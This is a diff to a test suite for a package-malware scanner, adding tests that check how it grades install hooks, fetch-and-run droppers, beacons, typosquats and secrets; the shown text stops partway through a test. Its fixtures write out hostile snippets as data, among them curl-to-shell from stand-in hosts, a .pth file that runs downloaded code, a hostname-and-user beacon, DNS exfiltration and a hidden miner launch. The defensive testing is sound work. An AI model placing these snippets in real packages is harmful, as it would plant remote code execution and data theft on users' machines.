@@ -5520,14 +5520,23 @@ class TestAPayoutAddressIsNotAMiner:
         )
         assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
 
-    def test_an_address_in_an_install_hook_still_is(self, tmp_path) -> None:
-        """And the second control, which is the one place a bare address keeps its
-        weight: nothing legitimate puts a payout address in code that runs on somebody
-        else's machine without being asked."""
+    def test_a_donation_address_in_an_install_hook_is_not_mining(self, tmp_path) -> None:
+        """core-js prints a Bitcoin donation address from its `postinstall` banner on every
+        install. An address in a hook is a request for money until something uses it."""
         (tmp_path / "setup.py").write_text(
             "from setuptools import setup\n\n"
+            'print("Support us: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq")\n'
+            'setup(name="p", version="1.0.0")\n'
+        )
+        assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH] == []
+
+    def test_an_address_handed_to_a_launched_process_is(self, tmp_path) -> None:
+        """The control: the payout address beside the means to use it."""
+        (tmp_path / "setup.py").write_text(
+            "import subprocess\nfrom setuptools import setup\n\n"
             'PAYOUT = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
             'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
+            'subprocess.Popen(["/tmp/.cache/kworker", "-u", PAYOUT])\n'
             'setup(name="p", version="1.0.0")\n'
         )
         assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
@@ -6728,7 +6737,9 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.test | sh -s -- -y\n"
             "curl -LsSf https://astral.test/uv/install.sh | sh\n"
         )
-        assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]
+        # Reported, at the severity a script a person runs carries: `--fail-on medium` blocks
+        # it, and the same line in an install hook or a pipeline blocks by default.
+        assert [f for f in self._dropper(tmp_path) if f.severity == Severity.MEDIUM]
 
 
 class TestHelpTextIsNotAPipelineStep:
@@ -8637,10 +8648,13 @@ class TestABacktickInProseIsNotACommand:
             for r in RuleSet(RuleLoader.load_builtin())
             if r.id in self.RULES
         }
+        # Two higher each since the benign agent-instruction fixtures: agent instructions quote
+        # commands in backticks as prose, and the baseline is a raw measurement over every
+        # benign file (the engine itself never applies shell rules to Markdown).
         assert declared == {
-            "CAP.SH.SPAWN.001": 2,
-            "CAP.PHP.SPAWN.001": 1,
-            "CAP.MK.SPAWN.001": 1,
+            "CAP.SH.SPAWN.001": 4,
+            "CAP.PHP.SPAWN.001": 3,
+            "CAP.MK.SPAWN.001": 3,
         }
 
 
@@ -10354,11 +10368,12 @@ class TestWhichLineTheDropperPointsAt:
 
     def test_and_the_finding_is_still_made(self, tmp_path) -> None:
         """The control. Sourcing a remote file from a branch is a dropper, and one script
-        doing it reports at full severity."""
+        doing it is reported -- at MEDIUM, because a person runs it; see
+        `TestFetchAndRunOnRequest` for where the same line blocks."""
         (tmp_path / "setup.sh").write_text(self.SCRIPT)
         found = [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"]
         assert found
-        assert found[0].severity >= Severity.HIGH
+        assert found[0].severity == Severity.MEDIUM
 
 
 class TestEveryVerbOnOneResourceIsNotEveryResource:
@@ -12759,3 +12774,811 @@ class TestACommandNobodyRunsOnInstall:
             encoding="utf-8",
         )
         assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
+
+
+class TestHookFilesAreNotFixturesByAWordInTheirDirectory:
+    """A lifecycle script naming a file is evidence it runs; `samples` in a package's directory
+    name is a guess about what it is for. The guess had ceilinged the payload below the gate."""
+
+    def _scan(self, tmp_path, directory: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        package = tmp_path / directory
+        package.mkdir(parents=True)
+        (package / "package.json").write_text(
+            '{"name":"p","version":"1.0.0","scripts":{"preinstall":"node index.js"}}',
+            encoding="utf-8",
+        )
+        (package / "index.js").write_text(
+            'require("child_process").exec("curl -s https://h.invalid/x | sh")\n', encoding="utf-8"
+        )
+        return {
+            (f.rule_id, f.severity.name)
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_a_word_in_the_name_does_not_ceiling_the_hook(self, tmp_path) -> None:
+        # The hooked file is read as install-time code, so its payload is what blocks; the
+        # declaration beside it is graded by what it runs.
+        found = self._scan(tmp_path, "@acme-data-samples/package")
+        assert ("MALWARE.DROPPER.001", "CRITICAL") in found
+        assert any(rule == "SUSPECT.INSTALL.SCRIPT.001" for rule, _ in found)
+
+    def test_a_whole_fixture_directory_still_does(self, tmp_path) -> None:
+        # The declaration is ceilinged there; a payload it runs still escalates, because the
+        # install-hook escalation is applied after every ceiling.
+        found = self._scan(tmp_path, "lifecycle/test/fixtures/pkg")
+        assert ("SUSPECT.INSTALL.SCRIPT.001", "HIGH") not in found
+
+
+class TestStartupFilesRunAtInstall:
+    def test_a_pth_with_an_executed_payload_is_install_time_code(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "evil.pth").write_text(
+            'import urllib.request as u;exec(u.urlopen("https://h.invalid/s").read())\n',
+            encoding="utf-8",
+        )
+        found = {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+        assert "MALWARE.DROPPER.001" in found
+
+    def test_a_pth_of_paths_is_quiet(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "paths.pth").write_text("/opt/a\n../b\n", encoding="utf-8")
+        findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
+        assert not [f for f in findings if f.category.value != "operational"]
+
+
+class TestExecutablesNamedAsSource:
+    def test_an_elf_named_py_contradicts_its_name(self) -> None:
+        from cordon_scanner.detect.binary import BinaryDetector
+
+        found = BinaryDetector.identify(b"\x7fELF\x02\x01\x01" + b"\x00" * 64)
+        assert "executable" in (BinaryDetector.mismatch("pkg/_build.py", found) or "")
+
+    def test_a_shell_script_named_txt_is_left_alone(self) -> None:
+        from cordon_scanner.detect.binary import BinaryDetector
+
+        found = BinaryDetector.identify(b"#!/bin/sh\necho hi\n")
+        assert BinaryDetector.mismatch("notes.txt", found) is None
+
+
+class TestRegistryAdvisoriesAreAboutRegistryPackages:
+    """A local package and an alias are not the registry package their name spells."""
+
+    @staticmethod
+    def _recorded_as_malware(name: str, version: str) -> bool:
+        from cordon_scanner.intel.advisories import AdvisoryDatabase
+
+        return any(a.malicious for a in AdvisoryDatabase.bundled().matching("npm", name, version))
+
+    def _graph(self, name: str, text: str):
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.npm import NpmEcosystem
+
+        return NpmEcosystem().parse_lockfile(FileContent.from_bytes(name, text.encode()))
+
+    def test_a_yarn_alias_is_the_package_it_aliases(self) -> None:
+        graph = self._graph(
+            "yarn.lock",
+            '"scheduler-0-13@npm:scheduler@0.13.0":\n  version "0.13.0"\n'
+            '  resolved "https://registry.yarnpkg.com/scheduler/-/scheduler-0.13.0.tgz"\n',
+        )
+        assert [(e.name, e.version) for e in graph.entries] == [("scheduler", "0.13.0")]
+
+    def test_a_berry_range_is_not_an_alias(self) -> None:
+        graph = self._graph("yarn.lock", '"lodash@npm:^4.17.21":\n  version: 4.17.21\n')
+        assert [e.name for e in graph.entries] == ["lodash"]
+
+    def test_a_v1_alias_is_the_package_it_aliases(self) -> None:
+        graph = self._graph(
+            "package-lock.json",
+            '{"lockfileVersion":1,"dependencies":{"s13":{"version":"npm:scheduler@0.13.0"},'
+            '"shared":{"version":"file:../shared"}}}',
+        )
+        found = {(e.name, e.version, e.local) for e in graph.entries}
+        assert ("scheduler", "0.13.0", False) in found
+        assert ("shared", "file:../shared", True) in found
+
+    def test_a_linked_package_is_not_matched_against_registry_malware(self, tmp_path) -> None:
+        assert self._recorded_as_malware("eslint-plugin-react-internal", "0.0.0")
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "yarn.lock").write_text(
+            '"eslint-plugin-react-internal@link:./scripts/eslint-rules":\n  version "0.0.0"\n  uid ""\n',
+            encoding="utf-8",
+        )
+        found = {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+        assert "MALWARE.DEPENDENCY.KNOWN.001" not in found
+
+    def test_a_workspace_member_is_not_matched_against_registry_malware(self, tmp_path) -> None:
+        assert self._recorded_as_malware("vitest-config", "5.56.0")
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "cloud").mkdir()
+        (tmp_path / "vitest-config").mkdir()
+        (tmp_path / "cloud" / "package.json").write_text(
+            '{"name":"cloud","version":"1.0.0","dependencies":{"vitest-config":"5.56.0"}}',
+            encoding="utf-8",
+        )
+        (tmp_path / "vitest-config" / "package.json").write_text(
+            '{"name":"vitest-config","version":"5.56.0"}', encoding="utf-8"
+        )
+        found = {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+        assert "MALWARE.DEPENDENCY.KNOWN.001" not in found
+
+
+class TestBinaryDataUnderASourceName:
+    def test_nul_bytes_in_a_python_file_contradict_its_name(self) -> None:
+        from cordon_scanner.detect.binary import BinaryDetector
+
+        assert BinaryDetector.binary_source("pkg/_build.py", b"/* \x00 */\n\x7fELF\x02") is not None
+
+    def test_utf16_text_is_not_binary_data(self) -> None:
+        from cordon_scanner.detect.binary import BinaryDetector
+
+        assert BinaryDetector.binary_source("run.ps1", "Write-Host hi".encode("utf-16")) is None
+        assert BinaryDetector.binary_source("a.py", "﻿print(1)".encode("utf-16")) is None
+
+    def test_formats_that_carry_nuls_are_not_judged(self) -> None:
+        from cordon_scanner.detect.binary import BinaryDetector
+
+        assert BinaryDetector.binary_source("data.txt", b"a\x00b") is None
+
+
+class TestFetchAndRunOnRequest:
+    """Fetch-and-run blocks where it runs on its own, and is reported below the gate where a person
+    or a function call has to ask for it."""
+
+    def _severity(self, tmp_path, files: dict[str, str]) -> str | None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        for name, text in files.items():
+            path = tmp_path / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(text, encoding="utf-8")
+        found = [
+            f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id in ("SUSPECT.DROPPER.001", "MALWARE.DROPPER.001")
+        ]
+        return max(found, key=["LOW", "MEDIUM", "HIGH", "CRITICAL"].index) if found else None
+
+    def test_an_installer_script_is_reported_below_the_gate(self, tmp_path) -> None:
+        assert (
+            self._severity(tmp_path, {"install.sh": "curl -fsSL https://h.invalid/x.sh | sh\n"})
+            == "MEDIUM"
+        )
+
+    def test_the_same_script_run_by_an_install_hook_is_critical(self, tmp_path) -> None:
+        files = {
+            "install.sh": "curl -fsSL https://h.invalid/x.sh | sh\n",
+            "package.json": '{"name":"p","version":"1.0.0","scripts":{"postinstall":"sh install.sh"}}',
+        }
+        assert self._severity(tmp_path, files) == "CRITICAL"
+
+    def test_a_library_top_level_download_and_run_blocks(self, tmp_path) -> None:
+        source = (
+            "import subprocess, urllib.request\n"
+            'urllib.request.urlretrieve("https://h.invalid/s", "/tmp/s.py")\n'
+            'subprocess.Popen(["python3", "/tmp/s.py"])\n'
+        )
+        assert self._severity(tmp_path, {"pkg/__init__.py": source}) == "HIGH"
+
+    def test_a_download_and_run_inside_a_function_is_below_the_gate(self, tmp_path) -> None:
+        source = (
+            "import subprocess, urllib.request\n\n\ndef install_browser():\n"
+            '    urllib.request.urlretrieve("https://h.invalid/chrome", "/tmp/chrome")\n'
+            '    subprocess.run(["/tmp/chrome", "--version"])\n'
+        )
+        assert self._severity(tmp_path, {"pkg/browsers.py": source}) == "MEDIUM"
+
+    def test_a_decoded_payload_is_never_excused(self, tmp_path) -> None:
+        script = "echo aHR0cHM6Ly9oLmludmFsaWQveA== | base64 -d | xargs curl -fsSL | sh\n"
+        assert self._severity(tmp_path, {"install.sh": script}) == "HIGH"
+
+    def test_a_javascript_function_body_is_below_the_gate(self, tmp_path) -> None:
+        source = (
+            "const { execSync } = require('child_process');\n"
+            "async function setup() {\n"
+            "  execSync('curl -fsSL https://h.invalid/x.sh | sh');\n"
+            "}\n"
+            "module.exports = { setup };\n"
+        )
+        assert self._severity(tmp_path, {"lib/setup.js": source}) in ("MEDIUM", None)
+
+
+class TestOAuthClientIdentifiers:
+    def _found(self, tmp_path, text: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "auth.go").write_text(text, encoding="utf-8")
+        return [
+            (f.rule_id, f.severity.name)
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id.startswith("SECRET.")
+        ]
+
+    def test_a_client_id_is_not_a_secret(self, tmp_path) -> None:
+        assert self._found(tmp_path, 'const oauthClientID = "nibfk8biu12ju7hpqomr8b1e40"\n') == []
+
+    def test_a_native_client_secret_beside_its_id_is_below_the_gate(self, tmp_path) -> None:
+        text = (
+            'const rcloneClientID = "4131"\n'
+            'const rcloneObscuredClientSecret = "cMwrjWVmrHZp3gf1ZpCrlyGAmPpB-YY5BbVnO1fj-G9evcd8"\n'
+        )
+        assert ("SECRET.GENERIC.ASSIGNMENT.001", "MEDIUM") in self._found(tmp_path, text)
+
+    def test_a_client_secret_alone_keeps_its_severity(self, tmp_path) -> None:
+        text = 'const clientSecret = "cMwrjWVmrHZp3gf1ZpCrlyGAmPpB-YY5BbVnO1fj-G9evcd8"\n'
+        assert ("SECRET.GENERIC.ASSIGNMENT.001", "HIGH") in self._found(tmp_path, text)
+
+    def test_a_secret_id_is_still_a_secret(self) -> None:
+        from cordon_scanner.detect.secrets import names_identifier
+
+        assert names_identifier("approle_secret_id") is False
+        assert names_identifier("COPILOT_OAUTH_CLIENT_ID") is True
+
+
+class TestTheGoStandardLibraryIsADependency:
+    def _declared(self, text: str):
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.others import GoEcosystem
+
+        manifest = GoEcosystem().parse_manifest(FileContent.from_bytes("go.mod", text.encode()))
+        return {(d.name, d.spec) for d in manifest.dependencies}
+
+    def test_the_toolchain_directive_names_the_version(self) -> None:
+        text = "module x\n\ngo 1.23\n\ntoolchain go1.24.3\n\nrequire golang.org/x/net v0.1.0\n"
+        assert ("stdlib", "v1.24.3") in self._declared(text)
+
+    def test_without_a_toolchain_the_go_directive_does(self) -> None:
+        assert ("stdlib", "v1.22.0") in self._declared("module x\n\ngo 1.22\n")
+
+    def test_a_go_mod_with_no_directive_adds_nothing(self) -> None:
+        assert not any(name == "stdlib" for name, _ in self._declared("module x\n"))
+
+    def test_stdlib_raises_nothing_but_advisories(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "go.mod").write_text("module example.com/x\n\ngo 1.99.0\n", encoding="utf-8")
+        findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
+        assert not [f for f in findings if f.category.value != "operational"]
+
+
+class TestABodyTheLoadPathCallsIsTopLevel:
+    """Wrapping the payload in a function and calling it is one extra line, and must not move a
+    library's fetch-and-run below the gate."""
+
+    BODY = (
+        '    urllib.request.urlretrieve("https://h.invalid/s", "/tmp/s.py")\n'
+        '    subprocess.Popen(["python3", "/tmp/s.py"])\n'
+    )
+
+    def _severity(self, tmp_path, source: str, name: str = "pkg/__init__.py") -> str | None:
+        return TestFetchAndRunOnRequest()._severity(tmp_path, {name: source})
+
+    def test_called_at_module_level(self, tmp_path) -> None:
+        source = "import subprocess, urllib.request\n\ndef _x():\n" + self.BODY + "\n_x()\n"
+        assert self._severity(tmp_path, source) == "HIGH"
+
+    def test_called_through_another_function(self, tmp_path) -> None:
+        source = (
+            "import subprocess, urllib.request\n\ndef _x():\n"
+            + self.BODY
+            + "\ndef _y():\n    _x()\n\n_y()\n"
+        )
+        assert self._severity(tmp_path, source) == "HIGH"
+
+    def test_registered_rather_than_called(self, tmp_path) -> None:
+        source = (
+            "import atexit, subprocess, urllib.request\n\ndef _x():\n"
+            + self.BODY
+            + "\natexit.register(_x)\n"
+        )
+        assert self._severity(tmp_path, source) == "HIGH"
+
+    def test_a_decorator_defined_beside_it(self, tmp_path) -> None:
+        source = (
+            "import subprocess, urllib.request\n\ndef now(f):\n    f()\n    return f\n\n@now\ndef _x():\n"
+            + self.BODY
+        )
+        assert self._severity(tmp_path, source) == "HIGH"
+
+    def test_an_imported_decorator_registers(self, tmp_path) -> None:
+        source = (
+            "import subprocess, urllib.request\nfrom app import route\n\n@route('/x')\ndef _x():\n"
+            + self.BODY
+        )
+        assert self._severity(tmp_path, source) == "MEDIUM"
+
+    def test_a_javascript_function_called_at_load(self, tmp_path) -> None:
+        source = (
+            "const { execSync } = require('child_process');\n"
+            "function setup() {\n  execSync('curl -fsSL https://h.invalid/x.sh | sh');\n}\nsetup();\n"
+        )
+        assert self._severity(tmp_path, source, "lib/setup.js") == "HIGH"
+
+
+class TestAPrefixIsNotAKey:
+    def test_the_prefix_alone_is_not_a_credential(self) -> None:
+        from cordon_scanner.detect.secrets import SecretDetector
+
+        assert SecretDetector._assembled_spec(b"sk-", assembled=False, name="KEY_PREFIX") is None
+
+    def test_the_prefix_with_a_body_is(self) -> None:
+        from cordon_scanner.detect.secrets import CREDENTIAL_PREFIXES, SecretDetector
+
+        prefix = sorted(CREDENTIAL_PREFIXES)[0]
+        assert (
+            SecretDetector._assembled_spec(prefix + b"A1b2C3d4E5f6G7h8J9", name="token") is not None
+        )
+
+
+class TestEncodingIsNotDecoding:
+    def test_the_decode_capability_does_not_list_an_encoder(self) -> None:
+        from pathlib import Path
+
+        import cordon_scanner
+
+        text = (
+            Path(cordon_scanner.__file__).parent / "rules/builtin/capabilities-python.yaml"
+        ).read_text()
+        block = text.split("id: CAP.PY.AST.DECODE.001", 1)[1].split("\n  - id:", 1)[0]
+        assert "b64encode" not in block
+        assert "b64decode" in block
+
+
+class TestAPublishedPackagesHookIsGradedByWhatItRuns:
+    def _severity(self, tmp_path, files: dict[str, bytes]) -> list[str]:
+        import io
+        import tarfile
+
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for name, data in files.items():
+                info = tarfile.TarInfo(f"package/{name}")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        (tmp_path / "tool-1.0.0.tgz").write_bytes(buffer.getvalue())
+        return [
+            f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path / "tool-1.0.0.tgz")
+            .findings
+            if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"
+        ]
+
+    MANIFEST = b'{"name":"tool","version":"1.0.0","scripts":{"postinstall":"node install.js"}}'
+
+    def test_a_script_inside_the_package_is_below_the_gate(self, tmp_path) -> None:
+        files = {
+            "package.json": self.MANIFEST,
+            "install.js": b"const fs = require('fs');\nfs.mkdirSync('bin', {recursive: true});\n",
+        }
+        assert self._severity(tmp_path, files) == ["MEDIUM"]
+
+    def test_a_target_that_is_not_there_blocks(self, tmp_path) -> None:
+        assert self._severity(tmp_path, {"package.json": self.MANIFEST}) == ["HIGH"]
+
+    def test_a_binary_target_blocks(self, tmp_path) -> None:
+        manifest = b'{"name":"tool","version":"1.0.0","scripts":{"postinstall":"./bin/helper"}}'
+        files = {"package.json": manifest, "bin/helper": b"\x7fELF\x02\x01\x01" + b"\x00" * 64}
+        assert self._severity(tmp_path, files) == ["HIGH"]
+
+
+class TestBeaconsOutsideAHook:
+    SOURCE = (
+        "import getpass, socket, requests\n"
+        "{indent}data = {{'h': socket.gethostname(), 'u': getpass.getuser()}}\n"
+        "{indent}requests.get('https://collect.invalid/c', params=data)\n"
+    )
+
+    def _severity(self, tmp_path, source: str) -> list[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "pkg").mkdir()
+        (tmp_path / "pkg" / "__init__.py").write_text(source, encoding="utf-8")
+        return [
+            f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id == "SUSPECT.EXFIL.BEACON.001"
+        ]
+
+    def test_on_import_it_blocks(self, tmp_path) -> None:
+        assert self._severity(tmp_path, self.SOURCE.format(indent="")) == ["HIGH"]
+
+    def test_inside_an_uncalled_function_it_is_below_the_gate(self, tmp_path) -> None:
+        body = self.SOURCE.format(indent="    ").replace(
+            "import getpass, socket, requests\n",
+            "import getpass, socket, requests\n\ndef report():\n",
+        )
+        assert self._severity(tmp_path, body) == ["MEDIUM"]
+
+
+class TestAnAliasedInstallCommandIsAnOverride:
+    def test_the_alias_resolves(self) -> None:
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.pypi import PypiEcosystem
+
+        source = (
+            b"from setuptools import setup\n"
+            b"from setuptools.command.install import install as _install\n"
+            b"class install(_install):\n    def run(self):\n        _install.run(self)\n"
+            b"setup(name='x', cmdclass={'install': install})\n"
+        )
+        hooks = PypiEcosystem().parse_manifest(FileContent.from_bytes("setup.py", source)).hooks
+        assert any(h.kind == "consumerinstall" for h in hooks)
+
+
+class TestAFunctionHandedToACallIsReached:
+    def test_passed_as_an_argument(self) -> None:
+        from cordon_scanner.core.reachability import CallReachability
+
+        source = "def _later():\n    x = 1\n\nimport atexit\natexit.register(_later)\n"
+        assert CallReachability.deferred_lines({"a.py"}, {"a.py": source}) == frozenset()
+
+    def test_never_mentioned_stays_deferred(self) -> None:
+        from cordon_scanner.core.reachability import CallReachability
+
+        source = "def _later():\n    x = 1\n"
+        assert CallReachability.deferred_lines({"a.py"}, {"a.py": source}) == frozenset(
+            {("a.py", 2, 2)}
+        )
+
+
+class TestAPackageNamedLikeAPopularOne:
+    def _found(self, tmp_path, directory: str, name: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        root = tmp_path / directory
+        root.mkdir(parents=True)
+        (root / "setup.py").write_text(
+            f"from setuptools import setup\nsetup(name='{name}', version='0.1')\n", encoding="utf-8"
+        )
+        return [
+            f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id == "SUSPECT.TYPOSQUAT.PACKAGE_NAME.001"
+        ]
+
+    def test_an_extracted_sdist_of_a_squat_blocks(self, tmp_path) -> None:
+        assert self._found(tmp_path, "aiiohttp-0.1", "aiiohttp") == ["HIGH"]
+
+    def test_a_working_tree_is_below_the_gate(self, tmp_path) -> None:
+        assert self._found(tmp_path, "src", "aiiohttp") == ["MEDIUM"]
+
+    def test_the_real_package_is_not_its_own_squat(self, tmp_path) -> None:
+        assert self._found(tmp_path, "aiohttp-3.9.0", "aiohttp") == []
+
+    def test_an_unrelated_name_is_quiet(self, tmp_path) -> None:
+        assert self._found(tmp_path, "lighthouse-ledger-0.1", "lighthouse-ledger") == []
+
+
+class TestMoreDecodersAndDestinations:
+    def _rules(self, tmp_path, source: str) -> set[tuple[str, str]]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "mod.py").write_text(source, encoding="utf-8")
+        return {
+            (f.rule_id, f.severity.name)
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_z85_then_lzma_then_marshal_is_decode_and_execute(self, tmp_path) -> None:
+        source = "import base64, lzma, marshal\nexec(marshal.loads(lzma.decompress(base64.z85decode(BLOB))))\n"
+        assert any(rule == "SUSPECT.DECODE_EXEC.001" for rule, _ in self._rules(tmp_path, source))
+
+    def test_a_hostname_assembled_into_a_variable_is_dns_exfiltration(self, tmp_path) -> None:
+        source = (
+            "import base64, os, socket\n"
+            "def verify():\n"
+            "    u = base64.b32encode(os.environ.get('USER', '').encode()).decode()\n"
+            "    d = u + '.' + socket.gethostname() + '.lib.example.net'\n"
+            "    socket.gethostbyname(d)\n"
+        )
+        assert ("SUSPECT.EXFIL.DNS.001", "HIGH") in self._rules(tmp_path, source)
+
+    def test_a_configured_host_in_a_variable_is_not(self, tmp_path) -> None:
+        source = "import os, socket\nhost = os.environ['DB_HOST']\nsocket.gethostbyname(host)\n"
+        assert not any(rule == "SUSPECT.EXFIL.DNS.001" for rule, _ in self._rules(tmp_path, source))
+
+    @pytest.mark.parametrize(
+        ("url", "counted"),
+        [
+            ("http://54.242.228.151:8090/debug", True),
+            ("http://127.0.0.1:8000/", False),
+            ("http://169.254.169.254/latest/meta-data/", False),
+            ("http://10.0.0.5/", False),
+            ("http://192.0.2.10/", False),
+        ],
+    )
+    def test_a_public_ip_literal_is_an_informative_destination(
+        self, url: str, counted: bool
+    ) -> None:
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        content = FileContent.from_bytes("a.py", f'URL = "{url}"\n'.encode())
+        assert bool(CapabilityDetector._public_ip_url(content, "python")) is counted
+
+
+class TestAnInlineRequireRunsTheFile:
+    MANIFEST = b'{"name":"tool","version":"1.0.0","scripts":{"postinstall":"node -e \\"try{require(\'./postinstall\')}catch(e){}\\""}}'
+
+    def _findings(self, tmp_path, script: bytes):
+        return TestAPublishedPackagesHookIsGradedByWhatItRuns()._severity(
+            tmp_path, {"package.json": self.MANIFEST, "postinstall.js": script}
+        )
+
+    def test_a_benign_banner_is_below_the_gate(self, tmp_path) -> None:
+        assert self._findings(tmp_path, b"console.log('Thank you for using core-js');\n") == [
+            "MEDIUM"
+        ]
+
+    def test_the_required_file_runs_at_install(self, tmp_path) -> None:
+        import io
+        import tarfile
+
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        payload = b"require('child_process').exec('curl -s https://h.invalid/x | sh')\n"
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for name, data in {"package.json": self.MANIFEST, "postinstall.js": payload}.items():
+                info = tarfile.TarInfo(f"package/{name}")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        (tmp_path / "t.tgz").write_bytes(buffer.getvalue())
+        found = {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path / "t.tgz")
+            .findings
+        }
+        assert "MALWARE.DROPPER.001" in found
+
+
+class TestScopedPackagesInAYarnLockfile:
+    def _entries(self, text: str):
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.npm import NpmEcosystem
+
+        graph = NpmEcosystem().parse_lockfile(FileContent.from_bytes("yarn.lock", text.encode()))
+        return [(e.name, e.version) for e in graph.entries]
+
+    def test_berry(self) -> None:
+        text = '"@grpc/grpc-js@npm:1.12.6, @grpc/grpc-js@npm:^1.7.1":\n  version: 1.12.6\n  resolution: "@grpc/grpc-js@npm:1.12.6"\n'
+        assert self._entries(text) == [("@grpc/grpc-js", "1.12.6")]
+
+    def test_classic(self) -> None:
+        text = '"@babel/core@^7.0.0", "@babel/core@^7.1.0":\n  version "7.24.0"\n  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.24.0.tgz"\n'
+        assert self._entries(text) == [("@babel/core", "7.24.0")]
+
+    def test_unscoped_still_reads(self) -> None:
+        assert self._entries('lodash@^4.17.0:\n  version "4.17.21"\n') == [("lodash", "4.17.21")]
+
+
+class TestGoReplaceDirectives:
+    def _declared(self, text: str):
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.others import GoEcosystem
+
+        manifest = GoEcosystem().parse_manifest(FileContent.from_bytes("go.mod", text.encode()))
+        return {(d.name, d.spec, d.field_name) for d in manifest.dependencies}
+
+    def test_a_block_replace_builds_its_target(self) -> None:
+        text = (
+            "module x\n\nrequire github.com/docker/distribution v2.8.3+incompatible\n\n"
+            "replace (\n\tgithub.com/docker/distribution => github.com/distribution/distribution v2.8.2+incompatible\n)\n"
+        )
+        found = self._declared(text)
+        assert ("github.com/distribution/distribution", "v2.8.2+incompatible", "require") in found
+        assert ("github.com/docker/distribution", "v2.8.3+incompatible", "require") not in found
+
+    def test_a_local_replacement_is_not_a_module(self) -> None:
+        found = self._declared(
+            "module x\n\nrequire example.com/a v1.0.0\nreplace example.com/a => ../a\n"
+        )
+        assert not any(field == "require" and name == "example.com/a" for name, _, field in found)
+        assert ("example.com/a", "../a", "replace") in found
+
+    def test_a_replace_to_itself_at_another_version(self) -> None:
+        found = self._declared(
+            "module x\n\nrequire example.com/a v1.0.0\nreplace example.com/a v1.0.0 => example.com/a v1.0.5\n"
+        )
+        assert ("example.com/a", "v1.0.5", "require") in found
+        assert ("example.com/a", "v1.0.0", "require") not in found
+
+
+class TestEveryDropPointCanBeFound:
+    """The prefilter in front of the host matcher must pass every listed host, or the matcher
+    behind it never runs for that host."""
+
+    def test_each_host_passes_the_prefilter(self) -> None:
+        from cordon_scanner.intel.hosts import ALL_HOSTS, could_match, destination_matcher
+
+        missing = [
+            host
+            for host in sorted(ALL_HOSTS)
+            if not (
+                could_match(f'u = "https://x.{host}/p"'.encode())
+                and destination_matcher().search(f'"https://x.{host}/p"'.encode())
+            )
+        ]
+        assert missing == []
+
+
+class TestInstallCodeTooLargeToRead:
+    def test_a_padded_setup_py_blocks(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "setup.py").write_text(
